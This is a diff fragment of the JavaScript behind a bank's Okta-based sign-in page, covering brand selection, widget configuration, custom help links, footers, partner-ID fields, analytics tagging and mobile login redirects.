+						candidateBrandCode = 'connect';
+					} else {
+						var delimiter = redirectUri.indexOf('://');
+						if (delimiter !== -1) {
+							redirectUri = redirectUri.substring(delimiter + 3);
+							var pathCount = 0;
+							do {
+								delimiter = redirectUri.indexOf('/');
+								if (delimiter !== -1) {
+									if (pathCount === 2 || pathCount === 4) {
+										candidateBrandCode = redirectUri.substring(0, delimiter);
+										if (candidateBrandCode !== 'api' || pathCount === 4) {
+											break;
+										}
+									}
+									if (redirectUri.length > (delimiter + 1)) {
+										redirectUri = redirectUri.substring(delimiter + 1);
+									} else {
+										break;
+									}
+									pathCount++;
+								}
+							} while (delimiter !== -1);
+						}
+					}
+				} else if (requestContext.authentication.issuer) {
+					if (requestContext.authentication.issuer.name === 'Spectrum' || requestContext.authentication.issuer.name === 'FXOnline Banking') {
+						candidateBrandCode = 'fxonlinebanking';
+					}
+				}
+			}
+
+			function isCandidateBrandCodeValid() {
+				if (candidateBrandCode) {
+					if (typeof brands !== 'undefined') {
+						if (typeof brands[candidateBrandCode] !== 'undefined') {
+							return true;
+						}
+					}
+				}
+				return false;
+			}
+
+			var brandCode = 'default';
+			var brandConfig = null;
+			window.addEventListener('load', function() {
+				
+				if (! isCandidateBrandCodeValid()) {
+					candidateBrandCode = getQueryString('brand');
+				}
+				if (! isCandidateBrandCodeValid()) {
+					candidateBrandCode = getCookie('brand');
+				}
+				if (isCandidateBrandCodeValid()) {
+					brandCode = candidateBrandCode;
+				}
+
+
+				brandConfig = brands[brandCode];
+				initAdobe();
+				initOkta(brandConfig);
+
+				document.cookie = 'brand=' + brandCode + '; domain=securebanklogin.com; path=/; secure';
+				document.body.classList.add("brand-" + brandCode);
+
+				loadFooter(brandConfig);
+				setTimeout(function() {
+					loadSSOHeader(brandConfig);
+					addCustomSSOLinks(brandConfig);
+				}, 1000);
+			});
+
+			function loadSSOHeader(brandConfig){
+
+				if(brandConfig.isPartner === false || brandCode !== "sso") {
+					return;
+				}
+
+				// query for div tag to place new header into
+				var container = document.getElementsByClassName("okta-form-title o-form-head")[0];
+
+				// create new div tag to display header text, force styles and eleminate inherited styles
+				var div = "<div id='header' style='margin-left: -30px;margin-right: -30px; padding:0px;'>" + brandConfig.header + "</div>"
+
+				// replace h2 text (Sign In) with new div tag
+				container.innerHTML = div;
+			}
+
+			function addCustomSSOLinks(brandConfig) {
+				if(brandCode !== "sso") return;
+
+				// query for UL links on page and select Forgot password?
+				var ulList = document.getElementsByClassName("help-links js-help-links")[0];
+
+				// qualitiy checks
+				if(!ulList || !ulList.children || ulList.children.length < 1) return;
+
+				// add style to hide Forgot password?
+				ulList.children[0].style.display = "none";
+
+				// create span tag for link text
+				var newSpan = document.createElement("span");
+
+				// and link text
+				newContent = document.createTextNode("New Customer? ");
+
+				// add the text node to the newly created span
+				newSpan.appendChild(newContent);
+
+				// quality check
+				if(ulList.children.length > 1 && ulList.children[1].children && ulList.children[1].children.length > 0)
+				{
+					// query UL links on page and select second one (New Customer?)
+					var anchor = ulList.children[1].children[0];
+
+					// add link text next to link field
+					ulList.children[1].insertBefore(newSpan, anchor);
+				}
+
+				// create span tag for link text
+				newSpan = document.createElement("span");
+
+				// add link text
+				newContent = document.createTextNode("New Business Customer? ");
+
+				// add the text node to the newly created span
+				newSpan.appendChild(newContent);
+
+				// quality check
+				if(ulList.children.length > 2 && ulList.children[2].children && ulList.children[2].children.length > 0)
+				{
+					// query UL links on page and select third one (New Business Customer?)
+					anchor = ulList.children[2].children[0];
+
+					// add link text next to link field
+					ulList.children[2].insertBefore(newSpan, anchor);
+				}
+			}
+			function loadFooter(brandConfig) {
+				try {
+					var footer = brandConfig.footer;
+					var now = new Date().getFullYear().toString();
+					if (footer === 'banking') {
+						footer =
+								'<div class="footer-utility">\n' +
+								'    <a href="' + brandConfig.privacyPolicy + '">Privacy Policy</a>\n' +
+								'    <a href="' + brandConfig.securityStatement + '">Security Statement</a>\n' +
+								'    <a class="fdic-link" href="#">Member FDIC</a>\n' +
+								'    <a class="ehl-link" href="#"><img src="https://www.securebanklogin.com/brand/images/logo-equal-housing-lender.png" alt="Equal Housing Lender" title="Equal Housing Lender"></a>\n' +
+								'</div>\n' +
+								'<div class="copyright">\n' +
+								'    <p>Copyright &copy; ' + now + ' ' + brandConfig.brandName + '. All Rights Reserved.</p>\n' +
+								'    <p>' + brandConfig.address + '</p>\n' +
+								'</div>';
+					}
+					else{
+						footer = footer.replace("copyrightYear", now);
+					}
+					document.getElementById('footer').innerHTML = footer;
+
+					document.querySelectorAll('.fdic-link').forEach(function (obj) {
+						obj.addEventListener('click', function () {
+							siteDisclosure(brandConfig.brandName, 'FDIC', 'http://www.fdic.gov/');
+						});
+					});
+					document.querySelectorAll('.ehl-link').forEach(function (obj) {
+						obj.addEventListener('click', function () {
+							siteDisclosure(brandConfig.brandName, 'HUD', 'http://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp');
+						});
+					});
+				} catch (err) {}
+			}
+
+
+			function transformPartnerUserId(username, operation) {
+				var partnerId = document.getElementById('okta-signin-partner-id').value;
+				return '_' + partnerId + '_' + username;
+			}
+
+			function initPartnerLogin() {
+				var userInput = document.getElementById('okta-signin-username');
+				if (! userInput) {
+					userInput = document.getElementById('account-recovery-username');
+				}
+				if (userInput) {
+					var userInputContainer = userInput.parentNode.parentNode.parentNode;
+					var partnerIdDiv = document.createElement('div');
+					partnerIdDiv.setAttribute('data-se', 'o-form-fieldset');
+					partnerIdDiv.classList.add('o-form-fieldset', 'o-form-label-top', 'margin-btm-5');
+					partnerIdDiv.innerHTML = '<div data-se="o-form-label" class="okta-form-label o-form-label"><label for="okta-signin-partner-id">Partner&nbsp;ID&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-partner-id" class="o-form-input-name-partner-id o-form-control okta-form-input-field input-fix"><input type="text" placeholder="" name="agentIdentifier" id="okta-signin-partner-id" size="6" maxlength="6" value="" aria-label="" autocomplete="off" required=""></span><p id="input-container-error-partnerid" class="okta-form-input-error o-form-explain" role="alert" style="color: #d93434; display: none; padding-top: 8px"><span class="icon icon-16 error-16-small" role="img" aria-label="Error" style="; padding-left: 18px;"></span>Please enter a Partner ID</p></div>';
+					userInputContainer.parentNode.insertBefore(partnerIdDiv, userInputContainer);
+					userInputContainer.children[0].children[0].innerHTML = 'Employee/HR ID&nbsp;';
+					setTimeout(function() {
+						document.getElementById('okta-signin-partner-id').focus();
+					}, 250);
+				}
+			}
+
+			function showPartnerIDError() {
+				var partnerIdElement = document.getElementById('okta-signin-partner-id');
+				if (! partnerIdElement.value || partnerIdElement.value.trim() === "") {
+					document.getElementById('input-container-error-partnerid').style.display = 'block';
+				} else {
+					document.getElementById('input-container-error-partnerid').style.display = 'none';
+				}
+			}
+
+			function afterRender(context) {
+				try {
+					if (brandCode === 'connect') {
+						initPartnerLogin();
+						var partnerIdElement = document.getElementById('okta-signin-partner-id');
+						if (partnerIdElement) {
+							partnerIdElement.addEventListener('blur', showPartnerIDError);
+						}
+					}
+					if (brandCode === 'fxonlinebanking') {
+						var helpLinks = document.getElementById('help-links-container');
+						if (helpLinks) {
+							helpLinks.innerHTML = '<li>For password assistance, please contact your bank representative.</li>';
+						}
+					}
+				} catch (err) {}
+				try {
+					if (typeof utag !== 'undefined') {
+						utag.link({
+							'page_name':determineAdobePageName(context),
+							'brand_code':brandCode
+						});
+					} else {
+						utag_data.page_name = determineAdobePageName(context);
+						utag_data.brand_code = brandCode;
+					}
+				} catch (err) {}
+				clickRememberMeCheckbox();
+				try {
+					var formList = document.getElementsByTagName('form');
+					if (formList && formList.length > 0) {
+						var i;
+						for (i = 0; i < formList.length; i++) {
+							if (formList[i]) {
+								formList[i].removeEventListener('submit', handleFormSubmit);
+								formList[i].addEventListener('submit', handleFormSubmit);
+							}
+						}
+					}
+				} catch (err) {}
+				try {
+					var helpLink = document.getElementById('help-links-container');
+					if (helpLink) {
+						helpLink.removeAttribute('style');
+					}
+				} catch (err) {}
+			}
+
+			function handleFormSubmit() {
+				try {
+					setTimeout(clickRememberMeCheckbox, 1000);
+				} catch (err) {}
+			}
+
+			function clickRememberMeCheckbox() {
+				try {
+					var rememberDeviceElements = document.getElementsByName('rememberDevice');
+					if (rememberDeviceElements && rememberDeviceElements.length > 0) {
+						var i;
+						for (i = 0; i < rememberDeviceElements.length; i++) {
+							if (rememberDeviceElements[i] &&
+									rememberDeviceElements[i].type &&
+									rememberDeviceElements[i].type === 'checkbox' &&
+									rememberDeviceElements[i].checked === false) {
+								rememberDeviceElements[i].click();
+							}
+						}
+					}
+				} catch (err) {}
+			}
+
+			function determineAdobePageName(context) {
+				var path = window.location.pathname;
+				var adobeName;
+				if (path in pathToPageNames) {
+					adobeName = pathToPageNames[path];
+				} else if (/\/signin\/refresh-auth-state(\/.*)?/.test(path)) {
+					adobeName = 'Sign In Main Refresh Auth';
+				} else if (context !== null) {
+					adobeName = context.controller;
+				}
+				return adobeName;
+			}
+
+			function afterError(context, error) {
+				if (typeof utag !== 'undefined') {
+					try {
+						var errorMessage = error.message;
+						if (error.statusCode) {
+							errorMessage = error.statusCode + ": " + errorMessage;
+						}
+						if (error.xhr && error.xhr.responseText) {
+							errorMessage = errorMessage + ": " + error.xhr.responseText;
+						}
+						utag.link({
+							'page_name':determineAdobePageName(context),
+							'adobe_event':'error',
+							'error_name':error.name,
+							'error_message':errorMessage
+						});
+					} catch (err) {}
+				}
+			}
+
+			function initOkta(brandConfig) {
+				console.log(window.location);
+				var hostNameEnv = window.location.hostname === 'authq.securebanklogin.com' ? 'wwq.securebanklogin.com' : 'www.securebanklogin.com';
+				const consumerEnrollment = window.location.hostname === 'authq.securebanklogin.com' ? 'wwq.firstbankcard.com/ConsumerWeb/firstbankcard/enroll/show-enroll' : 'www.firstbankcard.com/ConsumerWeb/firstbankcard/enroll/show-enroll';
+				const commercialEnrollment = window.location.hostname === 'authq.securebanklogin.com' ? 'wwq.firstbankcard.com/CommercialWeb/enroll/enroll-form' : 'www.firstbankcard.com/CommercialWeb/enroll/enroll-form';
+				var config = OktaUtil.getSignInWidgetConfig();
+				config.colors = {
+					brand: brandConfig.colors.brand
+				};
+				config.logo = brandConfig.logo;
+				config.language = 'en';
+				config.features = {};
+				config.features.router = true;
+				config.features.rememberMe = true;
+				config.features.autoPush = true;
+				config.features.consent = true;
+				config.features.smsRecovery = false;
+				config.features.callRecovery = false;
+				config.features.selfServiceUnlock = false;
+				config.features.multiOptionalFactorEnroll = true;
+				config.features.showPasswordToggleOnSignInPage = true;
+				config.i18n = {
+					'en': {
+						'enroll.choices.title': 'Additional Security for your Account',
+						'enroll.choices.description.generic': 'Your security is important to us.  Set up one or more of the options below as an added layer of security when logging into your account.',
+						'enroll.choices.optional': 'Set up another security option below or click Finish to continue to your account.',
+						'enroll.choices.list.enrolled': 'Enrolled options:',
+						'enroll.choices.list.optional': 'Additional security options:',
+						'error.username.required': 'Please enter a user ID',
+						'errors.E0000004': 'Login Failed. Verify User ID/Password are correct or click Forgot Password.',
+						'errors.E0000068': 'Your code doesn’t match our records.  Please try again.',
+						'errors.E0000082': 'Each code can only be used once. Please click Send Code below to receive a new one.',
+						'factor.call.description': 'Enter a single-use code provided through voice instructions.',
+						'factor.email.description': 'Enter a single-use code sent to your email. You must have a valid email address on file to use.',
+						'factor.sms': 'SMS (Text) Authentication',
+						'factor.sms.description': 'Enter a single-use code sent to your mobile phone by text.',
+						'help': 'Need help?',
+						'model.validation.field.username': 'Please check your user ID',
+						'password.complexity.no_username': 'no parts of your user ID',
+						'password.complexity.no_username.description': 'No parts of your user ID',
+						'password.expired.title.generic': 'Your password has expired',
+						'password.oldPassword.placeholder': 'Temporary password',
+						'password.oldPassword.tooltip': 'Temporary password',
+						'primaryauth.username.placeholder': 'User ID',
+						'primaryauth.username.tooltip': 'User ID'
+					}
+				};
+				var idmBrandCode = brandCode;
+				if(brandConfig.homePageUrl.indexOf("www.firstbankcard.com") !== -1){
+					idmBrandCode = 'firstbankcard';
+				}
+				if(brandConfig.homePageUrl.indexOf("www.fnbolending.com") !== -1){
+					idmBrandCode = 'fsl';
+				}
+				var forgotContextRoot = 'auth';
+				config.helpLinks = {
+					forgotPassword: 'https://' + hostNameEnv + '/' + forgotContextRoot + '/' +  idmBrandCode  + '/forgot'
+				};
+				if (brandCode !== 'connect') {
+					config.helpLinks.custom = [
+						{
+							text: 'Forgot User ID?',
+							href: 'https://' + hostNameEnv + '/' + forgotContextRoot + '/' +  (idmBrandCode === 'fnbomaha' ? 'fnbo' : idmBrandCode)  + '/forgot-user-id'
+						}
+					];
+				}
+				if (brandCode === 'connect') {
+					config.transformUsername = transformPartnerUserId;
+					config.features.rememberMe = false;
+				}
+				if(brandCode === "sso")
+				{
+					agentBank = getQueryString('agentBank');
+
+					// use agentBank to set brandConfig JSON object.
+					if(setBrandConfigFrom(agentBank) == true){
+						config.helpLinks.custom = [
+							{
+								text: 'Enroll Now',
+								href: 'https://' + consumerEnrollment
+							},
+							{
+								text: 'Enroll Now',
+								href: 'https://' + commercialEnrollment
+							}
+						];
+					}
+				}
+				var stateToken = getQueryString('stateToken');
+				if (stateToken) {
+					config.stateToken = stateToken;
+				}
+
+				var fromMobile = getQueryString('app');
+				if (fromMobile) {
+					var mobileRedirectHostName = window.location.hostname === 'authq.securebanklogin.com' ? 'wwc.securebanklogin.com' : 'www.securebanklogin.com';
+					config.relayState = 'https://' + mobileRedirectHostName + '/api/v1/okta-auth/mobile/redirect/' + fromMobile;
+					config.signOutLink = config.relayState;
+				}
+
+				function mobileCompleteLogin(res) {
+					location.href = config.relayState + '?sessionToken=' + res.session.token;
+				}
+
+				var oktaSignIn = new OktaSignIn(config);
+				oktaSignIn.on('afterRender', afterRender);
+				if (fromMobile) {
+					oktaSignIn.on('afterError', function(context, error) {
+						if (error && error.message === 'Invalid token provided') {
+							location.href = config.relayState;
+						} else {
+							afterError(context, error);
+						}
+					});
+				} else {
+					oktaSignIn.on('afterError', afterError);
+				}
+				oktaSignIn.renderEl({ el: '#okta-login-container' },
+						fromMobile ? mobileCompleteLogin : OktaUtil.completeLogin,
+						function(error) {
+							console.log(error.message, error);
+						}
+				);
+			}
+
+			function setBrandConfigFrom(agentBank){
+				if(agentBank === null) return;
+
+				// not an array so iterate by keys
+				for(var i = 0; i < Object.keys(brands).length; i++){
+
+					// get brandCode name
+					var brandCodeName = Object.keys(brands)[i];
+
+					// get the whole object using key brandCodeName
+					var instance = brands[brandCodeName];
+
+					// check if agentBank matches the filter value
+					if(instance.agentBank === agentBank)
+					{
+						// set global brandCode object with this instance
+						brandConfig = instance;
+						// all done, return
+						return true;
+					}
+				}
+				brandConfig = brands["default"];
+				brandCode = "default";
+				return false;
+			}
+			function initAdobe() {
+				try {
+					utag_data.page_name = determineAdobePageName(null);
+					utag_data.brand_code = brandCode;
+
+					var a = window.location.hostname === 'authq.securebanklogin.com' ? '//assets.adobedtm.com/aaee7fd81fbc/ad0c2e8d01f4/launch-27a175b536b3-staging.min.js' : '//assets.adobedtm.com/aaee7fd81fbc/ad0c2e8d01f4/launch-43eac16005c7.min.js';
+					var b=document;var c='script';var d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
+					a=b.getElementsByTagName('body')[0].firstChild;a.parentNode.insertBefore(d,a);
+				} catch (err) {}
+			}
+
+			function getQueryString() {
+				var key = false;
+				var res = {};
+				try {
+					var itm = null;
+					var pattern = /([^&=]+)=([^&]*)/g;
+					var qs = location.search.substring(1);
+					if (arguments.length > 0 && arguments[0].length > 1) {
+						key = arguments[0];
+					}
+					while (itm = pattern.exec(qs)) {
+						if (key !== false && decodeURIComponent(itm[1]) === key) {
+							return decodeURIComponent(itm[2]);
+						} else if (key === false) {
+							res[decodeURIComponent(itm[1])] = decodeURIComponent(itm[2]);
+						}
+					}
+				} catch (err) {}
+				return key === false ? res : null;
+			}
+
+			function getCookie(cname) {
+				try {
+					var name = cname + "=";
+					var decodedCookie = decodeURIComponent(document.cookie);
+					var ca = decodedCookie.split(';');
+					for(var i = 0; i <ca.length; i++) {
+						var c = ca[i];
+						while (c.charAt(0) === ' ') {
+							c = c.substring(1);
+						}
+						if (c.indexOf(name) === 0) {
+							return c.substring(name.length, c.length);
+						}
+					}
+				} catch (err) {}
+				return null;
+			}
+
+			function siteDisclosure(ourSite, newSite, newSiteURL) {
+				var confirmValue = confirm("You are now leaving " + ourSite + "'s web site.  Any products and services accessed through this web site are not provided by " + ourSite + ".  " + newSite + " may have a privacy policy and security policy that are different than " + ourSite + ".  Please review " + newSite + "'s privacy and security policies.");
+				if (confirmValue) {
+					window.open(newSiteURL);
+				}
+			}
+		})();
+	</script>
+
+</body></html>
